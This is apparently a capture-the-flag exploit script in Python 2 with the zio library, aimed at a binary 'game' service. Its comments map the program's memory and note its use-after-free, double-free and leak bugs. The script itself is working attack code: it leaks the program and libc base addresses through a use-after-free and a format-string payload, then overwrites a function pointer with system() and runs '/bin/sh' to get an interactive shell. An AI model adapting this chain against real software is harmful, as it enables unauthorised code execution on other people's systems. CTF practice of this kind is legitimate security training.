from zio import *

off_comment         = 0x1510
off_show            = 0xdaf
off_build_mana_pool = 0xe15
off_buy_spells      = 0xf4d
off_vuln            = 0x14f6
off_show            = 0xe09

# mem
    # 0x4080 0x20   func_name func_adr func_descriptioin 0x6c
    
    # 0x4100 0x21   name            0
    
    # 0x4120 0x4    adr_mana_pool   8   (malloc)
    
    # 0x4128 0x4    age             10
    # 0x412c 0x4    attack_spells   11
    # 0x4130 0x4    defend_spells   12
    # 0x4134 0x4    left_mana       13
    # 0x4138 0x4    adr_comment     14

# mana_pool
    # 0x0   0x4     num_spells_slot
    # 0x4   0x8     left_spells_slot
    # 0x8   0x4 * n adr_slot

# mana
    # 0x0           name_spell
    # 0x10          func                4
    # 0x14          spell_num           5
    # 0x18          spell_attack        6
    # 0x1c          usable_times        7

# vulns
    # call free
        # fun_buy_spell         free without reset
        # fun_vuln_attack       free without reset ; double free
    # call malloc
        # fun_buy_spell
        # fun_build_mana_pool
        # func_comment
    # read_str                  leak

# target = ('172.16.0.81', 10003)
target = './9a1f97e99ebbhhbb_game'

io  = zio(target, print_read = False, print_write = False)
# io  = zio(target, print_read = COLORED(RAW, 'blue'), print_write = COLORED(RAW, 'red'), timeout = 100000)
# io.hint([elf_base + off_show])

io.wl('A' * 0x100)
io.wls(['build_mana_pool', 5])                      # build 5 mana pools, malloc(0x20)

# leak elf base
io.wls(['buy_spell', 'fire', 1])                    # buy spell, malloc(0x20)

for i in xrange(0x5): io.wls(['attack_boss', 1])    # attack boss, free 5 spell
io.wl('show')                                       # leak elf base
io.rtl('A' * 0x20)
elf_base            = l32(io.r(8)[4:]) - 0xdaf
print '[+] find elf base: 0x%x' % elf_base

# leak libc
off_printf          = 0x780
adr_printf          = elf_base + off_printf
io.wls(['comment', '0x%{}$08x\x00'.format(0x133).ljust(0x10, 'A') + l32(elf_base + off_printf)])
io.wls(['attack_boss', 1])                          # uaf
io.rtl('0x')
adr_libc_ret_main   = int(io.r(8), 16)
off_system          = 0x00040190
off_libc_ret_main   = 0x19a83
libc_base           = adr_libc_ret_main - off_libc_ret_main
adr_system          = libc_base + off_system
print '[+] __libc_start_main_ret : 0x%x' % adr_libc_ret_main
print '[+] libc base : 0x%x' % libc_base
print '[+] system : 0x%x' % adr_system

# get shell
io.wls(['comment', '/bin/sh\x00'.ljust(0x10, 'A') + l32(adr_system)])
io.wls(['attack_boss', 1])                          # uaf

io.itr()
